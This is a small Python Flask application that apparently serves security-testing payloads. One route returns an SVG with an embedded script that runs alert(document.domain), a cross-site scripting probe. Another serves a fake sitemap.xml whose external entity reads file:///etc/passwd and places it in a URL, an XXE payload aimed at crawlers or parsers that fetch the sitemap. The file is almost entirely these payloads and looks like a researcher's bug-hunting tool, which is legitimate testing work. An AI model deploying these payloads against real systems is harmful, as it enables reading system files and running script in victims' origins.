from flask import Flask, Response
import textwrap

app = Flask(__name__)

@app.route('/')
def home():
    return 'Hello, World!'

@app.route('/svg')
def about():
    svg = """<?xml version="1.0" encoding="UTF-8"?>
    <svg xmlns="http://www.w3.org/2000/svg">
        <script>alert(document.domain)</script>
    </svg>"""
    return Response(svg, mimetype="image/svg+xml")

@app.route("/sitemap.xml")
def sitemap():
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE urlset [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
        <url>
            <loc>https://w41test.vercel.app/?=&xxe;</loc>
            <lastmod>2025-07-30</lastmod>
            <changefreq>daily</changefreq>
            <priority>1.0</priority>
        </url>
    </urlset>
    """
    return Response(xml_content, mimetype="application/xml")